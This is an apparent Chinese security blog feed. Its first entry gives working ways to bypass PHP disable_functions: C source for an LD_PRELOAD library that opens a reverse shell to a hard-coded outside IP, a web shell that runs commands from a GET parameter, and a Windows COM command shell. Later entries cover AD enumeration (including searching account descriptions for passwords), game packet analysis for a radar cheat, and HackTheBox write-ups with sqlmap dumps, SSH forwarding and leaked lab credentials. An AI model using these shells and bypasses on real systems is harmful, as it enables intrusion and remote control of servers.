        <content type="html"><![CDATA[<p>如果遇到PHP禁用了一大批危险函数比如 system, exec, shell_exec, passthrough 等情况，但是可以上传任意文件，并且能知道上传位置的情况。</p><p>可以用三种方法绕过</p><ol><li><strong>LD_PRELOAD绕过</strong></li></ol><p>方法A. mail函数调用劫持getuid()</p><p>bypass.c</p><p>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;</p><p>#include &lt;netinet/in.h&gt;<br>#include &lt;arpa/inet.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;sys/shm.h&gt;<br>void sh() {<br>        int    sockfd, n,rec_len;<br>    struct sockaddr_in    servaddr;<br>    int * a[1];<br>    a[0] = NULL;</p><pre><code>sockfd = socket(AF\_INET, SOCK\_STREAM, 0);memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sin\_family = AF\_INET; servaddr.sin\_port = htons(787); inet\_pton(AF\_INET, &quot;42.159.5.246&quot;, &amp;servaddr.sin\_addr);connect(sockfd, (struct sockaddr\*)&amp;servaddr, sizeof(servaddr));dup2(sockfd, 0);dup2(sockfd, 1);dup2(sockfd, 2);execve(&quot;/bin/bash&quot;, NULL, a);</code></pre><p>}<br>int  __attribute__((constructor)) test1() {<br>if (getenv(“LD_PRELOAD”) == NULL) { return 0; }<br>unsetenv(“LD_PRELOAD”);<br>sh();<br>}</p><p>编译成so文件</p><p>gcc -fPIC bypass.c -shared -o bypass.so</p><p>上传编译好的文件后，执行php代码</p><?phpputenv("LD\_PRELOAD=/tmp/bypass.so");mail("test@localhost","","","","");?><p>指定好so文件的路径，然后执行就完事了</p><p>方法B. mail()方法优化魔改版</p><p>bypass_disablefunc.c</p><p>#define _GNU_SOURCE</p><p>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;string.h&gt;</p><p>extern char** environ;</p><p>__attribute__ ((__constructor__)) void preload (void)<br>{<br>    // get command line options and arg<br>    const char* cmdline = getenv(“EVIL_CMDLINE”);</p><pre><code>// unset environment variable LD\_PRELOAD.// unsetenv(&quot;LD\_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick.int i;for (i = 0; environ\[i\]; ++i) &#123;        if (strstr(environ\[i\], &quot;LD\_PRELOAD&quot;)) &#123;                environ\[i\]\[0\] = &#39;\\0&#39;;        &#125;&#125;// executive commandsystem(cmdline);</code></pre><p>}</p><p>编译</p><p>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</p><p>上传后执行php文件</p><?php    echo "<p> <b>example</b>: http://site.com/bypass\_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass\_disablefunc\_x64.so </p>";    $cmd = $\_GET\["cmd"\];    $out\_path = $\_GET\["outpath"\];    $evil\_cmdline = $cmd . " > " . $out\_path . " 2>&1";    echo "<p> <b>cmdline</b>: " . $evil\_cmdline . "</p>";    putenv("EVIL\_CMDLINE=" . $evil\_cmdline);    $so\_path = $\_GET\["sopath"\];    putenv("LD\_PRELOAD=" . $so\_path);    mail("", "", "", "");    echo "<p> <b>output</b>: <br />" . nl2br(file\_get\_contents($out\_path)) . "</p>";     unlink($out\_path);?><p>访问该PHP文件并附带example中的参数执行。</p><p><strong>2.pcntl_exec 绕过</strong></p><p>pcntl_exec 函数，也可以执行命令，但是没有回显</p><?phpswitch (pcntl\_fork()) {  case 0:    pcntl\_exec('/bin/bash', \['/tmp/exec.sh'\]);    exit(0);  default:    break;}**3\. Win平台下com绕过**Windows系统组件COM在Windows默认就存在，是位于System32目录下的wshom.ocx文件。### 环境配置先在php.ini中查看是否已经开启com.allow\_dcom，若未开启则将前面的;分号去掉：<table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">; allow Distributed-COM calls</span></span><span class="line"><span class="comment">; http://php.net/com.allow-dcom</span></span><span class="line">com.allow_dcom = true</span></pre></td></tr></tbody></table>然后在php/ext/里面查找是否存在php\_com\_dotnet.dll这个文件。再到php.ini中查看是否存在extension=php\_com\_dotnet.dll这项，有的话去掉注释开启，否则直接添加上去即可。重启服务，在phpinfo中查看是否开启了：![](/images/3.png)### Bypass前提通过phpinfo知道disable\_functions选项如下：<table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span></pre></td></tr></tbody></table>此时在Web服务器中写入任意的以上函数的WebShell都是无法执行命令的。上传comshell.php至Web服务器中：<table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><span class="line">$stdout = $exec-&gt;StdOut();</span><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><span class="line"><span class="keyword">echo</span> $stroutput;</span><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr></tbody></table>这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable\_functions禁用PHP命令执行函数的限制：![](/images/4.png) 参考资料：长亭内部文档  [PHP 绕过 disable functions - 安全服务 - Confluence.webarchive](https://wp.jinzz.cc/wp-content/uploads/2020/07/PHP-绕过-disable-functions-安全服务-Confluence.webarchive.zip)https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AD域枚举</title>
      <link href="18f2a4d83911/"/>
      <url>18f2a4d83911/</url>
      
        <content type="html"><![CDATA[<p>Powershell .NET 原生枚举命令</p><p><img src="/images/1-1.png"></p><p>一定要加了域才能成功执行，不然会有红字报错。</p><p>为了之后枚举更方便，我们选择使用其他第三方模块帮助我们。</p><p>因为PowerView已经被很多第三方杀毒软件标记为病毒，所以我们不选择它。</p><p>我们转而使用微软官方支持的ADModule。<a href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a></p><p>导入模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Import-Module .\\ActiveDirectory\\ActiveDirectory.psd1</span><br></pre></td></tr></table></figure><p><img src="/images/917feac0bee79da00257f9b6f1e4a834.png"></p><p>可以看到，得到的信息比之前的命令详细的多。</p><p>接下来用命令获取DC域控机的信息</p><p><img src="/images/c4d0495a86dfb38b3c92b4e6b9240e94.png"></p><p>可以看到，域控机的系统IP地址和域控端口都显示了出来。</p><p>我们可以导出查看域控内所有用户的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADUser -Filter \* -Properties \*  导出所有AD用户的所有信息</span><br><span class="line">Get-ADUser -Filter \* -Properties \* | select name  导出所有AD用户的Name字段</span><br><span class="line">Get-ADUser -Identity P.atf.ssis-de -Properties \*  导出特定AD用户的所有信息</span><br></pre></td></tr></table></figure><p><img src="/images/ceb0b92095a09628a7c2be39916c8f39.png"></p><p>还有一些命令可以帮助我们确认哪些AD用户近期可能是活跃的，比如可以查看所有AD用户的最近一次更改密码的时间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADUser -Filter \* -Properties \* | Select name ,@&#123;expression=&#123;\[datetime\]:</span><br><span class="line">:fromFileTime($\_.pwdlastset)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/8d4016b211c24b470a394149a5cec6aa.png"></p><p>有些情况下，一些HelpDesk的操作人员为了方便操作，可能会把一些敏感的信息写入到AD用户的Describtion中，我们可以用如下命令进行查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADUser -Filter &#x27;Description -like &quot;\*password\*&quot;&#x27; -Properties Description</span><br><span class="line"> | select name,Description</span><br></pre></td></tr></table></figure><p>查询域内所有计算机信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer -Filter \* -Properties \*</span><br><span class="line">Get-ADComputer -Filter \* | select name</span><br><span class="line">Get-ADComputer -Filter &#x27;OperatingSystem -like &quot;\*Server 2016\*&quot;&#x27; -Properties OperatingSystem | select Name,OperatingSystem</span><br><span class="line">Get-AdComputer -Filter \* -Properties DNSHostName | %&#123;Test-Connection -Count 1 -ComputerName $\_.DNSHostName&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/87b30e820e57d1f3655a142867642d36.png"></p><p><img src="/images/3b9606fd5404e4c18b97c5188ef41f6d.png"></p><p>获取AD域内组信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADGroup -Filter \* -Properties \*</span><br><span class="line">Get-ADGroup -Filter \* | select Name</span><br><span class="line">Get-ADGroup -Filter &#x27;Name -like &quot;\*admin\*&quot;&#x27; | select Name</span><br></pre></td></tr></table></figure><p><img src="/images/e5375bdff1cc6f21d4fb4fdbd5083d00.png"></p><p><img src="/images/e8c2955afe43a63cb4f52a5c91d30d36.png"></p><p>获取AD域内管理员组的用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADGroupMember -Identity &quot;Domain Admins&quot; -Recursive</span><br><span class="line">Get-ADPrincipalGroupMembership -Identity username</span><br></pre></td></tr></table></figure><p><img src="/images/2edee95a18c7858ddc24dacd04c0af28.png"></p><p><img src="/images/f5dbe6d0598b7c876ff09269470cb8b2.png"></p><p>额外提一点，我们枚举Domain Admins这个组时发现的dsad_account就是我们默认的域内默认管理员用户，可以通过SID来判断，SID的前几部分都是和域相关，后面的500这个数字类似于用户ID的概念，这个500就是默认的administrator这个用户。</p><p>在EY的域内，我发现没法枚举自己账号的域内信息，研究了一下，这个工具默认只是指定了域信息为ey.net，而我的位置在pacrim这个子域内，所以一些指令需要在后面加-server指定一下子域：</p><p><img src="/images/ae47273340c9fd8d2c7561fcce299c78.png"></p>]]></content>
      
      
      <categories>
          
          <category> ad域攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逃离塔科夫-游戏网络数据包分析</title>
      <link href="84a99ca597d9/"/>
      <url>84a99ca597d9/</url>
      
        <content type="html"><![CDATA[<p>沉迷塔科夫，发现了一个基于网络流量分析的雷达外挂。</p><p>原理是它能够解密塔科夫的UDP游戏数据包，解析出有用的数据，比如其他玩家移动，玩家ID，游戏物品及其位置。</p><p>WireShark抓包获取UDP流量样本 <a href="https://wp.jinzz.cc/wp-content/uploads/2020/03/EFT_2020-3-17_Wireshark_packet.zip">EFT_2020-3-17_Wireshark_packet</a></p><p>原始数据如下</p><p><img src="/images/1.jpg"></p><p>红色的为客户端，蓝色的是服务器数据包。可以观察到数据包都以000开头，且多个零结尾，推测不可能为如TLS，AES等的强加密。ASCII，UTF8等都不是，尝试发现可以YAML解密。</p><p><img src="/images/2.jpg"></p><p>发现有把每一个包号都标注，同时仍有一些无法解密的数据，这些数据也有很强的逻辑关系，比如都以AA开头，中间有//////，同时以AAA=结尾。</p><p>推测可能为未知的加密方式或是游戏自建的内容传输机制。</p><p>采集一些经常出现了的样本，比较分析</p><p><img src="/images/3.jpg"></p><p>服务器发送过来的数据包中有大量这个格式的数据包，推测这应该就是我们想要的其他玩家移动的数据包。将不变的固定的位置圈出来。</p><p><img src="/images/3-1.jpg"></p><p>固定值有</p><p>AAn<br>PXE<br>//////////////////<br>FRUw<br>OAKoADABS<br>CoQA<br>AAAAA=</p><p>变动的值中有规律的有</p><p>l-k<br>L-r-7-b<br>r-s-t-u-v-w-x<br>D-j<br>A-B-C….-Z<br>w-4-A-I-Y-Q<br>Q-I<br>g-w-Q-A</p><p>变动区块中按顺序分析</p><p>3-2-1-3-1-1-3</p><p>第一块3个字符中，我们可以发现3处规律。</p><p>k-l  实际上是不停增大的所有字符合集，增大较慢</p><p>+-/-A-B-C-D-E-F 实际上是不停增大的所有字符合集，增大较快</p><p>L-r-7-b 四个不同的变量</p><p>我们稍作考虑，就可以发现，实际上AA是开头符号，然后后面的四位是逐渐增大的数字。</p><p>例子中的nk+ —&gt; nlF 实际上是逐渐增大的数据，而后的Lr7b我认为可以理解为4个方向，也许是xy坐标体系中的上下左右。也许是xyz坐标系的某个值？？？</p><p>而之后的PXE+r到x我认为可以和之前的理解为也是一样的逐渐增大的数据，只不过增长的特别慢，没有进位。而且增长速度特别统一，也许是游戏时间？？？</p><p>之后的D和j可以理解为一个是或否的数据，具体怎么理解没想通。</p><p>在后面的UwG —&gt; UwL后面也跟了Lr7b，和之前的特别像，也许也是代表坐标。</p><p>向后一位的EIMQ是单单一位增大特别快的字符合集。</p><p>0AKoAD在其他数据包中也经常见到，也许有特殊的含义。</p><p>之后跟了一个w-4-A-I-Y-Q，我认为这应该就是代表了三维坐标系中的上下左右前后。</p><p>之后则是CoQA被两个是否变量夹在中间。</p><p>然后就是一个逐渐增大的符号集合，后面跟着一个gwQA四变量。</p><p>具体这一类数据包什么作用，怎么分析，还需要控制一些变量抓更多的包来看，今天暂时到这。</p><h3 id="2020-10-10"><a href="#2020-10-10" class="headerlink" title="2020-10-10"></a>2020-10-10</h3><p>发现讲得很好的视频 <a href="https://www.youtube.com/watch?v=TG_FVzBijrk">https://www.youtube.com/watch?v=TG_FVzBijrk</a></p>]]></content>
      
      
      <categories>
          
          <category> 逆向与二进制 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>固件逆向分析</title>
      <link href="9e6f40d77f67/"/>
      <url>9e6f40d77f67/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wp.jinzz.cc/wp-content/uploads/2020/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98-2020.01.11.%E4%B8%8A%E6%B5%B7.pptx">逆向分析技术与实战-2020.01.11.上海</a></p><p>提取固件</p><p>使用binwalk分析固件，由哪些文件构成，可以把固件理解为一个压缩包，里面不只有程序，还有配置文件，秘钥文件等等。</p><p>binwalk -Me xxxxxx.w 来分析解压可以识别的文件。</p><p>使用firmwalker来自动分析查找被解压的文件中包含敏感信息的内容。</p><p>用IDA查找分析文件。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向与二进制 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android应用程序分析基础</title>
      <link href="0ece6d2c1482/"/>
      <url>0ece6d2c1482/</url>
      
        <content type="html"><![CDATA[<p>Android虚拟环境</p><p>hDalvik 靠JIT编译器解释为字节码，每次运行都需要将字节码编译为机器码，占用空间小，运行速度慢 ART 应用安装完成就将字节码编译成机器码，占用空间大，运行速度快</p><p>Android文件读写存储</p><p>APP 存储数据的方式 xml 文件读写 SQLite</p><p>xml秘钥对 /data/data/appname/shared_pref SQLite IOS和android都用,默认加密,但是可以破解 文件读写 /data/data/appname/file 读写到SD卡需要external_write权限</p><p>Android文件格式</p><p>java,c,apk,dex,odex,oat,so,xml,smali,jar</p><p>AndroidManifest.xml 为软件包命名，描述应用的各个组件，确定托管应用组件的进程，声明必须具备哪些权限，声明应用最低API级别，列出应用一定要链接到的库</p>]]></content>
      
      
      <categories>
          
          <category> 逆向与二进制 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Challenges HDC</title>
      <link href="2f6397f9f7a6/"/>
      <url>2f6397f9f7a6/</url>
      
        <content type="html"><![CDATA[<p>直接访问主页如下图所示</p><p><img src="/images/1.png"></p><p>需要登录凭据，先不爆破目录，可以看看源码和js文件内容。</p><p><img src="/images/2.png"></p><p>用Chrome浏览器自带的开发者工具（按F12），可以看到有两个js文件，一个是jquery-3.2.1.js，另一个是myscript.js。从名字上看第二个比较可疑，打开看下源码，发现调用了一个叫做doProcess的function。在jquery-3.2.1.js里面看看这个function。</p><p><img src="/images/3.png"></p><p>发现有两个比较可疑的字符串，猜测第一个是用户名，第二个是密码。</p><p>尝试之后成功登录。</p><p><img src="/images/4.png"></p><p>之后左边的每一个页面都查看一下，发现Malibox of Special Customers这个页面有一个比较可疑的图片，之前的图片都是一朵小花，到了这里则不是了。</p><p><img src="/images/5.png"></p><p>F12审查元素发现了一个没见过的目录。</p><p><img src="/images/6.png"></p><p>访问该目录发现了一个mail.txt文件，访问发现把其中的一个email填入到send email页面的输入框中就可以获得flag。</p><p><img src="/images/7.png"></p><p><img src="/images/8.png"></p><p><img src="/images/9.png"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.133 OneTwoSeven</title>
      <link href="15b94e393158/"/>
      <url>15b94e393158/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap 7.70 scan initiated Sat Aug 24 17:56:26 2019 as: nmap -Pn -sCV -p22,80 -oN nmap/Basic\_10.10.10.133.nmap 10.10.10.133 Nmap scan report for 10.10.10.133 Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA) | 256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA) |\_ 256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |\_http-server-header: Apache/2.4.25 (Debian) |\_http-title: Page moved. Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 24 17:56:41 2019 -- 1 IP address (1 host up) scanned in 15.15 seconds</span><br></pre></td></tr></table></figure><p>80端口存在web界面</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903065812.png"></p><p>可以注册一个账号，提供了sftp的帐号和密码</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903070006.png"></p><p>这个web提供了类似于在线建站的功能，能通过sftp上传web源码和内容到站点</p><p>但是上传php等可以被执行的访问都会跳转到403</p><p>换个思路，sftp客户端提供了一个system link功能，类似于windows下的快捷方式，能够创建一个到根文件系统的快捷方式来访问到其他内容。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903071417.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sftp&gt; symlink ../../../../../../ /public\_html/root</span><br></pre></td></tr></table></figure><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903071610.png"></p><p>在/var/www/html-admin/.login.php.swp中，存在一些凭据，同时发现60080端口存在另一个admin管理面板。</p><p><img src="/images/MYP_YIHFCBUF39U09@U.png"></p><p>跑个hashcat可以得到凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ots-admin:Homesweethome1</span><br></pre></td></tr></table></figure><p>但是这个60080端口是过滤状态，无法直接访问，需要portforward出来。</p><p>sftp是运行在ssh上面的，所以可以直接通过sftp的凭据转发端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -N -L 60080:127.0.0.1:60080 ots-4NzkzMDE@10.10.10.133 -vv</span><br></pre></td></tr></table></figure><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903072806.png"></p><p>可以得到另一组凭据，可以直接sftp获得user.txt</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903072847.png"></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903073101.png"></p><p>可以通过选项卡边上的 [DL] 下载相应的功能php源码，upload功能被禁用，但是通过阅读源码可以发现upload和download功能只是通过另一个功能被管理，可以通过另一种方式绕过被禁用的功能。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903074153.png"></p><p>事实上，只要请求的url</p><p>通过发送如下的请求包，我们可以绕过对upload功能的禁用，上传一个php shell到/addons</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903074325.png"></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190903080527.png"></p><p>root部分涉及到apt中间人攻击，步骤比较麻烦所以没有做，感兴趣的可以参照官方pdf</p><p><a href="https://wp.jinzz.cc/wp-content/uploads/2019/09/OneTwoSeven.pdf">https://wp.jinzz.cc/wp-content/uploads/2019/09/OneTwoSeven.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Challenges Freelancer</title>
      <link href="2137eebd8f8a/"/>
      <url>2137eebd8f8a/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/123.png"></p><p>第一眼看上去没什么特殊有意思的功能，最后可以提交一个表单，但是实际上表单的功能还没做完，是无法提交的，没什么有意思的。</p><p>查看一下源码，发现源码里有一些有意思的注释</p><!-- <a href="portfolio.php?id=1">Portfolio 1</a> --><p>看了第一眼猜测可能存在sql injection。</p><p>sqlmap跑了一下果然有。</p><p>先查看一下有意思的数据库内容。</p><p>sqlmap -u <a href="http://docker.hackthebox.eu:32943/portfolio.php?id=1">http://docker.hackthebox.eu:32943/portfolio.php?id=1</a> -T safeadmin –dump</p><p>[21:03:35] [INFO] fetching entries for table ‘safeadmin’ in database ‘freelancer’<br>Database: freelancer<br>Table: safeadmin<br>[1 entry]<br>+—-+———-+————————————————————–+———————+<br>| id | username | password                                                     | created_at          |<br>+—-+———-+————————————————————–+———————+<br>| 1  | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |<br>+—-+———-+————————————————————–+———————+</p><p>[21:03:35] [INFO] table ‘freelancer.safeadmin’ dumped to CSV file ‘/root/.sqlmap/output/docker.hackthebox.eu/dump/freelancer/safeadmin.csv’<br>[21:03:35] [INFO] fetched data logged to text files under ‘/root/.sqlmap/output/docker.hackthebox.eu’</p><p>发现数据库里储存了一串hash，hashcat跑的特别慢，虚拟机跑的只有58H/s，所以放弃爆破</p><p>sqlmap还有读取文件的功能，猜测这个web root 是在 /var/www/html ，尝试了一下果然是对的，再尝试读取一下这个portfolio的源码。</p><p>sqlmap -u <a href="http://docker.hackthebox.eu:32943/portfolio.php?id=1">http://docker.hackthebox.eu:32943/portfolio.php?id=1</a> –file-read=/var/www/html/portfolio.php</p><?php// Include config filerequire\_once "administrat/include/config.php";?>  <link rel="icon" href="favicon.ico" type="image/x-icon">  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">  <!-- Portfolio Modals -->  <!-- Portfolio Modal 1 --><pre><code>&lt;div class=&quot;modal-dialog modal-xl&quot; role=&quot;document&quot;&gt;  &lt;div class=&quot;modal-content&quot;&gt;    &lt;div class=&quot;modal-body text-center&quot;&gt;      &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row justify-content-center&quot;&gt;          &lt;div class=&quot;col-lg-8&quot;&gt;            &lt;!-- Portfolio Modal - Title --&gt;            &lt;!-- Icon Divider --&gt;            &lt;div class=&quot;divider-custom&quot;&gt;            &lt;!-- Portfolio Modal - Image --&gt;            &lt;img class=&quot;img-fluid rounded mb-5&quot; src=&quot;img/portfolio/cabin.png&quot; width=&quot;300&quot; height=&quot;300&quot;&gt;            &lt;!-- Portfolio Modal - Text --&gt;            &lt;p class=&quot;mb-5&quot;&gt;&lt;?php</code></pre><p>$id = isset($_GET[‘id’]) ? $_GET[‘id’] : ‘’;</p><p>$query = “SELECT * FROM portfolio WHERE id = $id”;<br>if ($result = mysqli_query($link, $query)) {</p><pre><code>/\* fetch associative array \*/while ($row = mysqli\_fetch\_row($result)) &#123;    printf (&quot;%s - %s\\n&quot;, $row\[1\], $row\[2\]);&#125;/\* free result set \*/mysqli\_free\_result($result);</code></pre><p>}</p><p>/* close connection */<br>mysqli_close($link);<br>?&gt;</p></p><pre><code>        &lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;</code></pre>  </div><p>发现源码里有调用 administrat/include/config.php 再去读取一下这个文件</p><?php$link = new mysqli("localhost", "db\_user", "Str0ngP4ss", "freelancer"); // Check connectionif($link === false){    die("ERROR: Could not connect. " . mysqli\_connect\_error());}?><p>发现了数据库的凭据，但是仍然没有什么用处。</p><p>既然发现了一个新的 administrat 目录，就用dirbuster扫一下。(之前也尝试过dirbuster扫根目录，就是因为他的目录都命名成了这种不完整的形式，所以一般情况扫不出来)</p><p>扫描之后发现了一个新的panel.php</p><p>读一下文件内容。</p><p><img src="/images/234.png"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Challenges Emdee five for life</title>
      <link href="2c90017fa52f/"/>
      <url>2c90017fa52f/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190821224725.png"></p><p>需要你写一个脚本来自动加密md5字符串然后自动提交，手动太慢，都是提示Too slow！</p><p>参考 <a href="https://www.cnblogs.com/qftm/p/11260600.html">https://www.cnblogs.com/qftm/p/11260600.html</a></p><p>import requests<br>import hashlib<br>import re</p><p>url=”<a href="http://docker.hackthebox.eu:34650/&quot;">http://docker.hackthebox.eu:34650/&quot;</a></p><p>r=requests.session()<br>out=r.get(url)</p><p>rr = re.compile(r”<h3 align='center'>(\S+)</h3>“, re.I)<br>str1 = rr.findall(out.text)<br>str2=hashlib.md5(str1[0].encode(‘utf-8’)).hexdigest()</p><p>data={‘hash’: str2}<br>out = r.post(url = url, data = data)</p><p>print(out.text)</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Challenges Fuzzy</title>
      <link href="27d6a101486f/"/>
      <url>27d6a101486f/</url>
      
        <content type="html"><![CDATA[<p>主页上并没有发现有意思的点，鉴于题目名字，直接上dirbuster fuzzing。</p><p>一开始只fuzzing出来了/api和其他的一级目录，直接访问/api会一直等待返回数据，直接继续fuzzing二级目录。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190821215223.png"></p><p>访问</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190821223905.png"></p><p>发现需要参数，尝试fuzzing参数，可以用burp也可以继续用dirbuster</p><p>fuzzing出来发现是 reset</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190821224303.png"></p><p>还需要fuzzing id</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190821224335.png"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.137 Luke</title>
      <link href="54fc3cd2eb70/"/>
      <url>54fc3cd2eb70/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |\_drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.7 | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |\_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: |\_ Potentially risky methods: TRACE |\_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |\_http-title: Luke 3000/tcp open http Node.js Express framework |\_http-title: Site doesn&#x27;t have a title (application/json; charset=utf-8). 8000/tcp open http Ajenti http control panel |\_http-title: Ajenti</span><br></pre></td></tr></table></figure><p> </p><p>开放了ftp，ssh，http和两个奇怪的端口。</p><p>3000端口是一个类似于API的东西</p><p>8000端口是一个Ajenti cms，爆破常用密码无效。</p><p>而FTP允许了匿名登录</p><p>发现存放了webapp/for_Chihiro.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dear Chihiro !!</span><br><span class="line"></span><br><span class="line">As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of </span><br><span class="line">the actual website I&#x27;ve created .</span><br><span class="line">Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! </span><br><span class="line"></span><br><span class="line">Derry</span><br></pre></td></tr></table></figure><p>在80端口dirbuster发现了一个数据库登录凭据</p><p><a href="http://10.10.10.137/config.php">http://10.10.10.137/config.php</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$dbHost = &#x27;localhost&#x27;; $dbUsername = &#x27;root&#x27;; $dbPassword = &#x27;Zk6heYCyv6ZE9Xcg&#x27;; $db = &quot;login&quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\\n&quot;. $conn -&gt; error);</span><br></pre></td></tr></table></figure><p>同时发现了一个需要凭据才能进入的入口</p><p><a href="http://10.10.10.137/management">http://10.10.10.137/management</a></p><p><img 